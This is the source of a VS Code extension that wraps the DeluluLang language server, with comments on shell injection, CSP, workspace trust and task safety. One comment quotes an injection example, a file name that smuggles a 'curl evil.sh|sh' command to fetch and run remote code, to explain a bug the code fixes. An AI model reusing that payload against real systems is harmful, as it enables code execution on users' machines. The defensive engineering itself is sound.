// The DeluluLang VS Code client — a thin shell around `delulu lsp` (Stage 8, spec §3).
// One server, every surface: this extension adds NOTHING the server doesn't provide,
// by rule (Constitution §8.4 — no editor-specific server features, ever).
//
// Every command registered here must also appear in `package.json`'s `contributes.commands`,
// and must cover every command the server emits in a code lens. `editor_contract.rs` fails the
// build if those three lists ever disagree — a lens the editor cannot execute is worse than no
// lens, because the server advertises an action the user cannot take.
const vscode = require("vscode");
const { LanguageClient } = require("vscode-languageclient/node");
const { resolveServer } = require("./server-resolve");
const { execFile } = require("child_process");

let client;
let status;

/// Explain a failed server launch the way a person would: what happened, why, and what to do.
async function reportUnavailable(why, missingFromPath) {
  const fix = missingFromPath
    ? "Install DeluluLang and make sure `delulu` is on your PATH, or set `delulu.serverPath` to the full path of the binary."
    : "Set `delulu.serverPath` to the full path of the `delulu` binary.";
  const choice = await vscode.window.showErrorMessage(
    `DeluluLang: the language server did not start, so there will be no diagnostics, hover, or ` +
      `completion.\n\nWhy: ${why}\n\nFix: ${fix}`,
    "Open Setting",
    "How do I install it?"
  );
  if (choice === "Open Setting") {
    await vscode.commands.executeCommand("workbench.action.openSettings", "delulu.serverPath");
  } else if (choice === "How do I install it?") {
    // Deliberately NOT a link to a hosting page. DeluluLang publishes to no registry and no
    // download page — the README says so in its own first table — so a button opening
    // `github.com/delulu-lang/delulu#installation` would send a stuck user to a 404 at the exact
    // moment they needed an answer. The instructions are short enough to simply give them.
    const doc = await vscode.workspace.openTextDocument({
      language: "markdown",
      content: [
        "# Installing the DeluluLang toolchain",
        "",
        "There is no release binary and no package-manager entry yet: you build from source.",
        "",
        "```",
        "git clone <the DeluluLang repository>",
        "cd DeluluLang",
        "cargo build --release          # rustup installs the pinned toolchain automatically",
        "cargo install --path crates/delulu    # puts `delulu` on your PATH (~/.cargo/bin)",
        "```",
        "",
        "If you would rather not install it, point the extension at the binary you just built:",
        "",
        "1. Open Settings and search for `delulu.serverPath`.",
        "2. Set it to the full path of `target/release/delulu` (`delulu.exe` on Windows).",
        "",
        "That setting is **machine-scoped on purpose** — a workspace cannot set it, because this",
        "extension launches it as a process the moment a `.delulu` file is opened.",
      ].join("\n"),
    });
    await vscode.window.showTextDocument(doc, { preview: true });
  }
}

/// Run the CLI with an **argv array** — never a command string.
///
/// `shellPath`/`shellArgs` exec the binary directly, so nothing parses the arguments as shell
/// syntax. The previous form built one string (`` `${serverPath} run ${fsPath}` ``) and sent it
/// to whatever shell the user has: a file named `x;curl evil.sh|sh.delulu` executed on click, and
/// far more routinely, ANY path containing a space ran the wrong command. Paths here come from an
/// editor tab, so they are attacker-influenced whenever a project is opened from a clone.
function runInTerminal(name, serverPath, args) {
  const t = vscode.window.createTerminal({ name, shellPath: serverPath, shellArgs: args });
  t.show();
}

/// Run the CLI and capture its stdout. `execFile`, so the argument vector is passed through and
/// nothing is parsed as shell syntax — the same rule every other execution path here follows.
function capture(exe, args, cwd) {
  return new Promise((resolve, reject) => {
    execFile(
      exe,
      args,
      // A timeout, because without one a server that hangs leaves this promise pending forever and
      // the user gets no panel and no error — the failure mode that looks like nothing happening.
      { cwd, maxBuffer: 32 * 1024 * 1024, timeout: 30_000 },
      (err, stdout, stderr) => {
        if (err) {
          reject(new Error(String(stderr || err.message).trim()));
        } else {
          resolve(stdout);
        }
      }
    );
  });
}

/// Put a `Content-Security-Policy` on a generated document, and **fail loudly if it cannot**.
///
/// `String.replace` with no match returns the input unchanged, so writing this inline as
/// `html.replace(/<head>/i, …)` would silently produce an un-policied page the day the generator's
/// output changed shape. That is fail-open: the security control disappears and everything still
/// looks like it worked. Returning `undefined` forces the caller to decide, and the caller refuses.
function withContentSecurityPolicy(html) {
  const meta =
    `<meta http-equiv="Content-Security-Policy" ` +
    `content="default-src 'none'; style-src 'unsafe-inline'; img-src data:;">`;
  const at = html.search(/<head[^>]*>/i);
  if (at === -1) {
    return undefined;
  }
  const end = html.indexOf(">", at) + 1;
  return html.slice(0, end) + meta + html.slice(end);
}

/// The authority atlas for a document, rendered in a panel beside it.
///
/// `delulu atlas --format html` already emits a **self-contained** document — no scripts, no fonts,
/// no images fetched from anywhere — which is what makes it safe to show in a webview at all. The
/// panel is still created with scripts disabled and a `Content-Security-Policy` that permits only
/// inline styles: the HTML is produced by our own binary from the user's own code, but "trusted
/// producer" is an argument that stops holding the moment someone adds a feature to that producer,
/// and a webview with scripting enabled runs with the extension's own reach.
async function showAtlas(serverPath, uri) {
  const doc = uri ? vscode.Uri.parse(uri) : vscode.window.activeTextEditor?.document.uri;
  if (!doc) {
    vscode.window.showWarningMessage("delulu: open a .delulu file to see its atlas.");
    return;
  }
  const folder = vscode.workspace.getWorkspaceFolder(doc);
  let html;
  try {
    html = await capture(serverPath, ["atlas", doc.fsPath, "--format", "html"], folder?.uri.fsPath);
  } catch (e) {
    vscode.window.showErrorMessage(
      `DeluluLang: could not build the atlas for this file.\n\nWhy: ${e.message}\n\n` +
        `Fix: the file must parse and type-check first — run \`delulu check\` on it.`
    );
    return;
  }
  const policed = withContentSecurityPolicy(html);
  if (!policed) {
    vscode.window.showErrorMessage(
      "DeluluLang: refusing to display the atlas — the generated document has no <head>, so no " +
        "Content-Security-Policy could be applied to it. This is a bug in `delulu atlas`; please " +
        "report it rather than working around it."
    );
    return;
  }
  const panel = vscode.window.createWebviewPanel(
    "deluluAtlas",
    `Atlas — ${doc.path.split("/").pop()}`,
    { viewColumn: vscode.ViewColumn.Beside, preserveFocus: true },
    { enableScripts: false, localResourceRoots: [] }
  );
  panel.webview.html = policed;
}

/// Tasks for the four commands people run in a loop, so ⇧⌘B and the Tasks palette work.
///
/// `ProcessExecution` takes an argv array and no shell, which is the same rule the terminal
/// commands follow — a `ShellExecution` here would reintroduce the injection that the run lens
/// already had once, this time through the workspace folder's own path.
///
/// `delulu fmt --check` rather than `delulu fmt`: a task that silently rewrites your files when you
/// press the build key is a surprise. The one that reports is safe to bind; the one that edits
/// should be a deliberate act.
function makeTaskProvider(serverPath) {
  const defs = [
    { command: "check", args: [], group: vscode.TaskGroup.Build, detail: "Type- and effect-check" },
    { command: "build", args: [], group: vscode.TaskGroup.Build, detail: "Resolve deps, verify pins and authority" },
    { command: "test", args: [], group: vscode.TaskGroup.Test, detail: "Run the authority-isolated tests" },
    { command: "fmt", args: ["--check"], group: undefined, detail: "Report unformatted files (does not rewrite)" },
  ];
  return {
    provideTasks() {
      const folders = vscode.workspace.workspaceFolders;
      if (!serverPath || !folders || folders.length === 0) {
        return [];
      }
      const tasks = [];
      // One task per command PER FOLDER: in a multi-root workspace a single task would silently
      // pick one root, and which one it picked would depend on folder ordering.
      for (const folder of folders) {
        for (const d of defs) {
          const t = new vscode.Task(
            { type: "delulu", command: d.command, args: d.args },
            folder,
            folders.length > 1 ? `${d.command} (${folder.name})` : d.command,
            "delulu",
            new vscode.ProcessExecution(serverPath, [d.command, ...d.args, "."], {
              cwd: folder.uri.fsPath,
            }),
            "$delulu"
          );
          t.detail = d.detail;
          if (d.group) {
            t.group = d.group;
          }
          tasks.push(t);
        }
      }
      return tasks;
    },
    resolveTask(task) {
      const cmd = task.definition.command;
      if (!serverPath || typeof cmd !== "string") {
        return undefined;
      }
      const extra = Array.isArray(task.definition.args) ? task.definition.args : [];
      return new vscode.Task(
        task.definition,
        task.scope ?? vscode.TaskScope.Workspace,
        task.name || cmd,
        "delulu",
        new vscode.ProcessExecution(serverPath, [cmd, ...extra]),
        "$delulu"
      );
    },
  };
}

/// Refuse to execute the workspace's own code in a workspace the user has not trusted.
///
/// `delulu run` and `delulu test` compile and execute the files in front of them. Analysis is
/// different in kind — parsing a hostile file is what a language server is for — which is why the
/// server still starts in Restricted Mode and only these two commands stop here.
function requireTrust(what) {
  if (vscode.workspace.isTrusted) {
    return true;
  }
  vscode.window.showWarningMessage(
    `delulu: ${what} is disabled in Restricted Mode, because it executes this workspace's code. ` +
      `Trust the folder (Workspaces: Manage Workspace Trust) to enable it.`
  );
  return false;
}

function activate(context) {
  // `machine-overridable` scope (see package.json) is what keeps this out of a repository's
  // `.vscode/settings.json`. It is load-bearing, not cosmetic: this path is spawned as a process
  // the moment a `.delulu` file opens, so a workspace that could set it would get code execution
  // on clone-and-open, with no click from the user. That was a real finding, witnessed against a
  // build of this extension before the scope was added.
  const configured = vscode.workspace.getConfiguration("delulu").get("serverPath", "delulu");
  const resolved = resolveServer(configured);

  // An ABSOLUTE path when resolution succeeded, `undefined` when it did not. There is deliberately
  // no fallback to the raw setting: falling back would hand a bare or relative name straight to the
  // OS, which is the exact lookup `resolveServer` exists to prevent.
  const serverPath = resolved.path;
  const haveServer = () => {
    if (serverPath) {
      return true;
    }
    reportUnavailable(resolved.error, resolved.missingFromPath === true);
    return false;
  };

  status = vscode.window.createStatusBarItem(vscode.StatusBarAlignment.Right, 100);
  status.name = "DeluluLang";
  context.subscriptions.push(status);
  status.show();

  // Resolution failing is not an error to swallow: without a server there are no diagnostics, and
  // an editor that silently stops checking is worse than one that never started.
  if (!serverPath) {
    status.text = "$(error) DeluluLang";
    status.tooltip = `Language server not started — ${resolved.error}`;
    status.command = "workbench.action.openSettings";
    reportUnavailable(resolved.error, resolved.missingFromPath === true);
  } else {
    status.text = "$(check) DeluluLang";
    status.tooltip = `DeluluLang language server\n${serverPath}`;

    client = new LanguageClient(
      "delulu",
      "DeluluLang",
      { command: serverPath, args: ["lsp"] },
      { documentSelector: [{ scheme: "file", language: "delulu" }] }
    );
    client.start().catch((e) => {
      status.text = "$(error) DeluluLang";
      status.tooltip = `Language server stopped: ${e}`;
      reportUnavailable(
        `\`${serverPath}\` was found, but did not start a language server (${e}). It may not be ` +
          `a \`delulu\` binary, or may be a version without \`delulu lsp\`.`,
        false
      );
    });
  }

  // Tasks compile and test the workspace's code, so they are gated on trust for the same reason
  // the run/test commands are. Registering the provider at all in Restricted Mode would put
  // "delulu: build" in the task list where pressing it would execute untrusted code.
  if (vscode.workspace.isTrusted) {
    context.subscriptions.push(
      vscode.tasks.registerTaskProvider("delulu", makeTaskProvider(serverPath))
    );
  }

  // The codeLens commands invoke the CLI in the integrated terminal — the lens says
  // what it runs; the terminal shows it honestly.
  context.subscriptions.push(
    vscode.commands.registerCommand("delulu.run", (uri) => {
      if (!requireTrust("running a file") || !haveServer()) {
        return;
      }
      runInTerminal("delulu run", serverPath, ["run", vscode.Uri.parse(uri).fsPath]);
    }),

    // The server sends `[uri, testName]`. Dropping the name ran the whole file, so clicking
    // "▶ run test" on one test silently ran every test in the document — including ones whose
    // declared effect row the package ceiling refuses, reporting failures the user never asked for.
    vscode.commands.registerCommand("delulu.test.run", (uri, testName) => {
      if (!requireTrust("running a test") || !haveServer()) {
        return;
      }
      const args = ["test", vscode.Uri.parse(uri).fsPath];
      if (testName) {
        args.push(testName);
      }
      runInTerminal("delulu test", serverPath, args);
    }),

    // The report is answered by the SERVER (`workspace/executeCommand` → `delulu.authority`); this
    // command is the editor-side affordance that asks for it and decides how to show it.
    //
    // The two names MUST differ. A language client registers a VS Code command for every entry in
    // the server's `executeCommandProvider.commands` during initialization, so registering
    // `delulu.authority` here collided with our own client: `registerCommand` threw
    // "command 'delulu.authority' already exists" from inside `client.start()`, which failed
    // initialization, dropped the didOpen notification, and shut the server down. The extension
    // shipped in that state — no diagnostics, no hover, no completion, in every workspace — and
    // nothing caught it, because the packaging tests check that a command is *registered* and the
    // server tests check that it *answers*. Neither one starts a client against a server.
    // Analysis, not execution: `atlas` reads and type-checks, it never runs the program. So this is
    // deliberately NOT trust-gated — the same reasoning that keeps diagnostics working in
    // Restricted Mode. It does spawn the server binary, which is why it needs `haveServer()`.
    vscode.commands.registerCommand("delulu.showAtlas", async (uri) => {
      if (!haveServer()) {
        return;
      }
      await showAtlas(serverPath, uri);
    }),

    vscode.commands.registerCommand("delulu.showAuthority", async (uri) => {
      if (!client) {
        vscode.window.showWarningMessage(
          "delulu: the language server is not running, so there is no authority report."
        );
        return;
      }
      // Invoked from the Command Palette there is no argument, so fall back to what is on screen.
      const target = uri || vscode.window.activeTextEditor?.document.uri.toString();
      if (!target) {
        vscode.window.showWarningMessage("delulu: open a .delulu file to see its authority.");
        return;
      }
      const report = await client.sendRequest("workspace/executeCommand", {
        command: "delulu.authority",
        arguments: [target],
      });
      if (!report) {
        vscode.window.showWarningMessage("delulu: no authority report for this document.");
        return;
      }
      if (report.error) {
        vscode.window.showWarningMessage(`delulu: ${report.error}`);
        return;
      }
      const doc = await vscode.workspace.openTextDocument({
        content: JSON.stringify(report, null, 2),
        language: "json",
      });
      await vscode.window.showTextDocument(doc, { preview: true });
    })
  );
}

function deactivate() {
  return client ? client.stop() : undefined;
}

module.exports = { activate, deactivate };
